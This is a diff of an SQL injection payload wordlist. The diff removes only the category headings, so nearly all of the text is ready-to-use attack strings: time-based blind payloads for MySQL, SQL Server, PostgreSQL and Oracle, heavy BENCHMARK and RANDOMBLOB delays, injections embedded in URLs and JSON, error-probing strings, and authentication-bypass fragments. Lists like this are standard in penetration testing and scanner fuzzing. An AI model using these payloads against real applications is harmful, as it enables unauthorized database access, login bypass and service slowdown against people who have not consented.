@@ -1,5 +1,3 @@
-MySQL Blind (Time Based):
-
 0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
 0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
 if(now()=sysdate(),sleep(5),0)
@@ -16,9 +14,6 @@ if(now()=sysdate(),sleep(5),0)
 desc%2c(select*from(select(sleep(5)))a)
 -1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))
 -1+or+1=((SELECT+1+FROM+(SELECT+SLEEP(5))A))(SELECT * FROM (SELECT(SLEEP(5)))YYYY)(SELECT * FROM (SELECT(SLEEP(5)))YYYY)#(SELECT * FROM (SELECT(SLEEP(5)))YYYY)--'+(select*from(select(sleep(5)))a)+'(select(0)from(select(sleep(5)))v)%2f'+(select(0)from(select(sleep(5)))v)+'"(select(0)from(select(sleep(5)))v)%2f*'+(select(0)from(select(sleep(5)))v)+'"+(select(0)from(select(sleep(5)))v)+"*%2f(select(0)from(select(sleep(5)))v)/*'+(select(0)from(select(sleep(5)))v)+'"+(select(0)from(select(sleep(5)))v)+"*/(select(0)from(select(sleep(5)))v)/*'+(select(0)from(select(sleep(5)))v)+'\"+(select(0)from(select(sleep(5)))v)+\"*/',''),/*test*/%26%26%09sLeEp(5)%09--+
-
-AND BLIND:
-
 1 and sleep 5--
 1 and sleep 5
 1 and sleep(5)--
@@ -41,9 +36,6 @@ AnD SLEEP(5)#
 ' AND SLEEP(5)#
 " AND SLEEP(5)#
 ') AND SLEEP(5)#
-
-OR BLIND:
-
 or sleep 5--
 or sleep 5
 or sleep(5)--
@@ -70,9 +62,6 @@ or sleep(5)='
 ") or sleep(5)="
 ) or sleep(5)='
 1 or sleep(5)#
-
-You can replace AND / OR
-
 1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)
 1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) AND (1337=1337
 1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
@@ -115,9 +104,6 @@ You can replace AND / OR
 ' AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY) OR '1337'='1337
 ') WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
 ") WHERE 1337=1337 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337
-
-RLIKE BLIND:
-
 RLIKE SLEEP(5)--
 ' RLIKE SLEEP(5)--
 ' RLIKE SLEEP(5)-- 1337
@@ -159,9 +145,6 @@ RLIKE SLEEP(5)--
 ") WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
 ' WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
 " WHERE 1337=1337 RLIKE SLEEP(5)-- 1337
-
-ELT Blind:
-
 ' AND ELT(1337=1337,SLEEP(5))--
 ' AND ELT(1337=1337,SLEEP(5))-- 1337
 " AND ELT(1337=1337,SLEEP(5))-- 1337
@@ -214,9 +197,6 @@ ELT Blind:
 ")) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
 ') AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
 ") AS 1337 WHERE 1337=1337 AND ELT(1337=1337,SLEEP(5))-- 1337
-
-BENCHMARK:
-
 ' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))--
 ' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
 " AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
@@ -240,7 +220,6 @@ BENCHMARK:
 "))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((("1337" LIKE "1337
 " AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND "1337" LIKE "1337
 ' AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND '1337'='1337
-
 ' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))--
 ' AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
 " AND 1337=BENCHMARK(5000000,MD5(0x774c5341))-- 1337
@@ -264,9 +243,6 @@ BENCHMARK:
 "))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((("1337" LIKE "1337
 " AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND "1337" LIKE "1337
 ' AND 1337=BENCHMARK(5000000,MD5(0x576e7a57)) AND '1337'='1337
-
-Microsoft SQL Server Blind (Time Based):
-
 ;waitfor delay '0:0:5'--
 ';WAITFOR DELAY '0:0:5'--
 );waitfor delay '0:0:5'--
@@ -304,9 +280,6 @@ WAITFOR DELAY '0:0:5'
 "))) WAITFOR DELAY '0:0:5'--
 1 waitfor delay '0:0:5'--
 1' waitfor delay '0:0:5'--
-
-Postgresql Blind (Time Based):
-
 ";SELECT pg_sleep(5);
 ;SELECT pg_sleep(5);
 and SELECT pg_sleep(5);
@@ -338,17 +311,11 @@ or pg_SLEEP(5)#
 or pg_sleep(5)--
 ) or pg_sleep(5)--
 )) or pg_sleep(5)--
-
-Oracle Blind (Time Based):
-
 1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)
 1 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5)-- 1337
 ' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND '1337'='1337
 ') AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND ('1337'='1337) 
 AND 1337=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(71)||CHR(73)||CHR(86),5) AND (1337=1337
-
-Generic Time Based SQL Injection Payloads:
-
 sleep(5)#
 (sleep 5)--
 (sleep 5)
@@ -393,18 +360,10 @@ OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
 RANDOMBLOB(1000000000/2)
 AND 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
 OR 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
-
-
-URL payloads:
-
 https://redact.com/page/if(now()=sysdate(),sleep(3),0)/"XOR(if(now()=sysdate(),sleep(3),0))OR"/
 https://redact.com/(select(0)from(select(sleep(5)))v)%2f'+(select(0)from(select(sleep(5)))v)+'"
 https://redact.com/page/1 AnD SLEEP(5)
 https://redact.com/page/1' ORDER BY SLEEP(5)
-
-
-Json based:
-
 [-1+or+1%3d((SELECT+1+FROM+(SELECT+SLEEP(5))A))]
 {AnD SLEEP(5)}
 {1 AnD SLEEP(5)}
@@ -413,22 +372,14 @@ Json based:
 "emails":["AnD SLEEP(5)"]
 "emails":["test@gmail.com' OR SLEEP(5)#"]
 {"options":{"id":[],"emails":["AnD SLEEP(5)"],
-
-param:
-
 =1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='
 =1'XOR(if(now()=sysdate(),sleep(5),0))OR'
 =1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-- 1337   
 =1 or sleep(5)#
 =0'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
 =(select(0)from(select(sleep(5)))v)
-
 email=test@gmail.com' WAITFOR DELAY '0:0:5'--
 email=test@gmail.com'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
-
-
-Sql detection payload (Generic Error):
-
 '
 "
 "'
@@ -501,9 +452,6 @@ Sql detection payload (Generic Error):
 *)(|(*
 *))%00
 -'
-
-SQL Injection Auth Bypass:
-
 '=' 'or'
 ' or ''='
 /1#\
